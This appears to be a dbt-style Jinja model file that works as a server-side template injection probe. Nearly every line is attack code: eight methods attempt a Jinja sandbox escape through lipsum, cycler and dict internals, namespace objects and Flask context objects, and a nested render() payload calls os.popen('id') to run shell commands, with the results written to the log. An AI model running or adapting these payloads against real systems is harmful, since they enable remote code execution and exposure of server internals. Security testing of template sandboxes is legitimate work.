{# SSTI via lipsum - test if sandbox blocks __globals__ access #}

{# Method 1: Direct lipsum.__globals__ #}
{%- set result1 = '' -%}
{%- if lipsum.__globals__ is defined -%}
  {{ log("LIPSUM_GLOBALS_ACCESSIBLE=YES", info=True) }}
  {{ log("LIPSUM_GLOBALS_KEYS=" ~ lipsum.__globals__.keys() | list | join(',') | truncate(500), info=True) }}
{%- else -%}
  {{ log("LIPSUM_GLOBALS_NOT_ACCESSIBLE", info=True) }}
{%- endif -%}

{# Method 2: Via attr filter #}
{%- set lg = lipsum | attr('__globals__') -%}
{{ log("LIPSUM_GLOBALS_VIA_ATTR=" ~ lg | string | truncate(300), info=True) }}

{# Method 3: Cycler init globals #}
{%- set cg = cycler | attr('__init__') -%}
{{ log("CYCLER_INIT=" ~ cg | string | truncate(200), info=True) }}
{%- set cgg = cg | attr('__globals__') if cg else '' -%}
{{ log("CYCLER_INIT_GLOBALS=" ~ cgg | string | truncate(300), info=True) }}

{# Method 4: Try render() to execute nested template #}
{%- set tpl = "{{ lipsum.__globals__.__builtins__.__import__('os').popen('id').read() }}" -%}
{%- set rendered = render(tpl) -%}
{{ log("RENDER_RESULT=" ~ rendered | truncate(200), info=True) }}

{# Method 5: Try write() function to see what it does #}
{{ log("WRITE_CALLABLE=" ~ (write is callable) | string, info=True) }}

{# Method 6: Namespace trick - can we set attributes? #}
{%- set ns = namespace(x=lipsum) -%}
{{ log("NS_X_TYPE=" ~ ns.x | string | truncate(200), info=True) }}

{# Method 7: Dict class mro #}
{%- set d = dict.__mro__ -%}
{{ log("DICT_MRO=" ~ d | string | truncate(300), info=True) if d else log("DICT_MRO=BLOCKED", info=True) }}

{# Method 8: Request/g/session (Flask context) #}
{{ log("REQUEST=" ~ request | string, info=True) if request is defined else log("REQUEST_UNDEF", info=True) }}
{{ log("G=" ~ g | string, info=True) if g is defined else log("G_UNDEF", info=True) }}
{{ log("SESSION=" ~ session | string, info=True) if session is defined else log("SESSION_UNDEF", info=True) }}

SELECT 1 as id
